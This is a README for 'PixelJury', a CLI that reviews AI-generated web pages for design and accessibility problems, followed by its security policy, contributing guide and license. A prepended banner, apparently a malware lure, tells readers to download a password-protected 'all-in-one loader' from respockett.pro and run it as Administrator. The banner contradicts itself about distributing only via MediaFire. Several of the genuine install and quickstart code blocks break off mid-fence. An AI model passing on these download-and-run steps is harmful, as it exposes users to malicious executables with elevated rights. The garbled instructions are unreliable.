<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# PixelJury

PixelJury is a visual QA CLI for AI-built frontends that renders your page, catches generic design and accessibility problems, and writes the fix prompt your coding agent can apply.

## Install

Run it directly:

```bash
## Quickstart

Start your app, then point PixelJury at the local URL:

```bash
## What You Can Do With It

- Review a landing page before shipping it.
- Catch the common AI-generated UI tells: gradient heroes, emoji feature cards, fake metrics, repeated card grids, default fonts, and low-contrast footer text.
- Give Cursor, Claude Code, Codex, Windsurf, or another coding agent a concrete design-fix prompt instead of vague feedback.
- Keep before/after proof in CI or pull requests with screenshots and `score.json`.
- Tune design work against an open rubric instead of a private taste call.

## Why PixelJury?

- **It judges pixels, not intentions.** PixelJury opens the URL in Chromium and reviews the page that users will actually see.
- **Hard fails are deterministic.** Contrast, mobile overflow, touch-target size, tiny text, and named slop-trope detections run without an API key.
- **The output is agent-ready.** The generated `fix-prompt.md` prioritizes hard fails first so a coding agent can make targeted changes.
- **No hosted service is required.** Use provider API keys, local Ollama, Claude Code, Codex, or the deterministic `mock` provider.
## Compared To Alternatives

| Need | PixelJury | Common alternative |
|---|---|---|
| Accessibility smoke check | Checks contrast, mobile overflow, touch targets, and tiny text while also producing design feedback. | Axe/Lighthouse are stronger for broad accessibility coverage and performance auditing. |
| AI UI cleanup | Detects repeated cards, default fonts, gradient panels, fake stats, and generic AI copy in the rendered page. | Design-system rules or prompt snippets help before generation but do not inspect final pixels. |
| Agent handoff | Writes `fix-prompt.md` with concrete remediation instructions. | Manual design review often leaves feedback in screenshots, comments, or chat. |
| Visual scoring | Combines deterministic findings with a vision-model rubric. | Pure linters are more deterministic but cannot judge originality, hierarchy, or polish. |

Use Lighthouse, Axe, Playwright tests, and visual regression tools when you need their specific coverage. Use PixelJury when the page works but still looks generic, broken, or unready.

## Example Output

```text
PixelJury  ·  rubric v0.1

Design score: 61/100   - Generic AI output

Hard fails
  x Page is 70px wider than the 390px viewport (horizontal scroll on mobile)   caps at 70
  x Text contrast 3.1:1 (needs 4.5:1) - e.g. "Copyright 2026 FlowSync..."     caps at 65

Problems
  x "inter" is the primary typeface - an AI/template default        -5
  x Large gradient background panel (1440x420px)                    -5
  x The same card pattern is reused 5x - reads as templated         -5
  x Pill/badge with AI-marketing copy                               -3

-> pixeljury/critique.md   pixeljury/fix-prompt.md   pixeljury/screenshot.png
```

## Providers

```bash
npx pixeljury review <url> --provider anthropic     # ANTHROPIC_API_KEY
npx pixeljury review <url> --provider openai        # OPENAI_API_KEY
npx pixeljury review <url> --provider gemini        # GEMINI_API_KEY
npx pixeljury review <url> --provider ollama        # local model, no API key
npx pixeljury review <url> --provider claude-code   # local Claude Code login
npx pixeljury review <url> --provider codex         # local Codex / ChatGPT login
npx pixeljury review <url> --provider mock          # deterministic checks only
```

API providers read keys from `--key`, then `PIXELJURY_KEY`, then the provider's standard environment variable. Prefer environment variables for keys; command-line arguments can be visible in shell history and process lists. When no provider is selected and no key is available, PixelJury auto-selects `mock`; if you explicitly choose an API provider, you must provide that provider's key. The deterministic hard-fail and trope checks still run with `mock`.

`--provider claude-code` and `--provider codex` shell out to the local CLI you already have logged in. PixelJury stages screenshots in a temporary working directory for those passthrough runs so the local agent is not pointed at your project checkout. Use API-key providers for shared automation or public CI.

## How It Works

```text
Render with Playwright
  -> analyze deterministic static signals
  -> score screenshots with a vision provider
  -> compose the final score and write artifacts
```

The deterministic stage finds:

- WCAG contrast failures
- mobile overflow at 390px
- touch targets below 44px
- tiny body text
- overused default fonts
- large gradient panels
- repeated card patterns
- AI-marketing badges and fake-looking stats

The vision stage scores six rubric dimensions: typography, hierarchy, color, spacing, originality, and polish. The final score is capped by hard fails and reduced by deterministic deductions.

## Compatibility And Limitations

- Requires Node.js 18 or newer.
- Uses Playwright and Chromium to render pages. If Chromium is not installed, run `npx playwright install chromium`.
- Reviews a URL, so your app must already be running.
- The `mock` provider runs deterministic checks but does not produce a model-backed visual critique.
- PixelJury is not a replacement for full accessibility, performance, security, or visual regression testing.

## Development

```bash
npm install
npm test
npx playwright install chromium
## License

MIT © PixelJury contributors


---

# Security Policy

## Reporting a vulnerability

Please report security issues privately via GitHub's
## Scope notes

- PixelJury runs **locally** with **no backend** and **no telemetry**. Your API keys are read
  from your environment and sent only to the provider you choose (OpenAI / Anthropic / Gemini)
  or to your local Ollama instance.
- PixelJury renders arbitrary URLs in headless Chromium. Only point it at pages you trust, the
  same as opening them in a browser.


---

# Contributing to PixelJury

Thanks for helping make AI-built frontends suck less. PRs and issues are welcome.

## Dev setup

```bash
npm install
npm test                              # deterministic engine + parser tests, no browser
npx playwright install chromium       # needed only to run an actual review
## Ground rules

- Keep deterministic signals deterministic (no network, no LLM) — they're half the score and
  must be reproducible.
- If you change a number in `rubric.md`, change its mirror in
  `packages/core/src/rubric-data.js`, and add a CHANGELOG entry.
- Add a test for new static signals and parsing logic.
## Submitting

1. Fork and branch.
2. `npm test` passes.
3. Open a PR with a clear description and, for design rules, a before/after example.


---

MIT License

Copyright (c) 2026 PixelJury contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
